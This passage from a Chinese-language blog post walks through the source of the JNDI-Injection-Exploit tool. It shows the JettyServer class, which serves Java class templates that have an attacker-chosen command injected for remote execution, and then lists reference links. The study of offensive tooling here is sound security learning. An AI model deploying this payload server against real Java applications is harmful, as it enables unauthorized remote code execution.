JettyServer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> HTTPServer supply .class file which execute command by Runtime.getRuntime.exec()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> welkin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Jetty是一个提供 HTTP服务器、HTTP客户端和javax.servlet容器的开源项目</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JettyServer</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> Server server;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String command;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public JettyServer(int port) &#123;</span></span><br><span class="line"><span class="comment">//        this.port = port;</span></span><br><span class="line"><span class="comment">//        server = new Server(port);</span></span><br><span class="line"><span class="comment">//        command = "open /Applications/Calculator.app";</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JettyServer</span><span class="params">(<span class="keyword">int</span> port,String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.port = port;</span><br><span class="line">        server = <span class="keyword">new</span> Server(port);</span><br><span class="line">        command = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ServletHandler handler = <span class="keyword">new</span> ServletHandler();</span><br><span class="line">        server.setHandler(handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理器 DownloadServlet 处理所有路径/*</span></span><br><span class="line">        handler.addServletWithMapping(DownloadServlet.class, "/*");</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.start();</span><br><span class="line">            server.join();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"serial"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据RequestURI，获取到相应的类模板</span></span><br><span class="line">            String filename = request.getRequestURI().substring(<span class="number">1</span>);</span><br><span class="line">            InputStream in = checkFilename(filename);</span><br><span class="line">            <span class="keyword">byte</span>[] transformed;</span><br><span class="line">            ByteArrayInputStream bain = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 传入模板和命令，用Transformers生成执行命令的字节流</span></span><br><span class="line">                    transformed = insertCommand(in,command);</span><br><span class="line">                    bain = <span class="keyword">new</span> ByteArrayInputStream(transformed);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Byte array build failed."</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Log a request to "</span> + request.getRequestURL());</span><br><span class="line">                response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">                response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span>+URLEncoder.encode(filename, <span class="string">"UTF-8"</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len ;</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                OutputStream out = response.getOutputStream();</span><br><span class="line">                <span class="keyword">if</span> (bain != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">while</span> ((len = bain.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">                    &#125;</span><br><span class="line">                    bain.close();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Read file error!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; URL("</span>+ request.getRequestURL() +<span class="string">") Not Exist!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">            doGet(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 检查请求的是ExecTemplateJDK7.class还是ExecTemplateJDK8.class，获取相应的类模板字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InputStream <span class="title">checkFilename</span><span class="params">(String filename)</span></span>&#123;</span><br><span class="line">        String template;</span><br><span class="line">        <span class="keyword">switch</span> (filename)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"ExecTemplateJDK7.class"</span>:</span><br><span class="line">                template = <span class="string">"template/ExecTemplateJDK7.class"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"ExecTemplateJDK8.class"</span>:</span><br><span class="line">                template = <span class="string">"template/ExecTemplateJDK8.class"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// <span class="doctag">TODO:</span>Add more</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Thread.currentThread().getContextClassLoader().getResourceAsStream(template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jndi：LDAPRefServer-java；RMIRefServer-java"><a href="#jndi：LDAPRefServer-java；RMIRefServer-java" class="headerlink" title="jndi：LDAPRefServer,java；RMIRefServer.java"></a>jndi：LDAPRefServer,java；RMIRefServer.java</h3><h3 id="RMIRefServer-java"><a href="#RMIRefServer-java" class="headerlink" title="RMIRefServer.java"></a>RMIRefServer.java</h3><p>参考链接：</p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/" target="_blank" rel="noopener">welk1n/JNDI-Injection-Exploit</a></p>
+<p><a href="https://juejin.im/post/6844903993060098055" target="_blank" rel="noopener">字节码增强之ASM</a></p>
+<p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">Java字节码增强探秘</a></p>
+<p><a href="https://zhenbianshu.github.io/2018/11/control_jvm_byte_code.html" target="_blank" rel="noopener">Java 动态字节码技术</a></p>
+<p><a href="https://www.jianshu.com/p/088277390eb4" target="_blank" rel="noopener">Jetty篇教程 之Jetty 嵌入式服务器</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-一些基础知识"><span class="toc-number">2.</span> <span class="toc-text">0x01 一些基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-结合代码深入学习"><span class="toc-number">3.</span> <span class="toc-text">0x02 结合代码深入学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#run：ServerStart-java"><span class="toc-number">3.1.</span> <span class="toc-text">run：ServerStart.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Util"><span class="toc-number">3.2.</span> <span class="toc-text">Util</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformers-动态生成执行命令的字节码"><span class="toc-number">3.2.1.</span> <span class="toc-text">Transformers-动态生成执行命令的字节码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jetty：JettyServer-java"><span class="toc-number">3.3.</span> <span class="toc-text">jetty：JettyServer.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi：LDAPRefServer-java；RMIRefServer-java"><span class="toc-number">3.4.</span> <span class="toc-text">jndi：LDAPRefServer,java；RMIRefServer.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIRefServer-java"><span class="toc-number">3.5.</span> <span class="toc-text">RMIRefServer.java</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&text=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&is_video=false&description=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JNDI-Injection-Exploit工具代码简单学习&body=Check out this article: http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&name=JNDI-Injection-Exploit工具代码简单学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&t=JNDI-Injection-Exploit工具代码简单学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
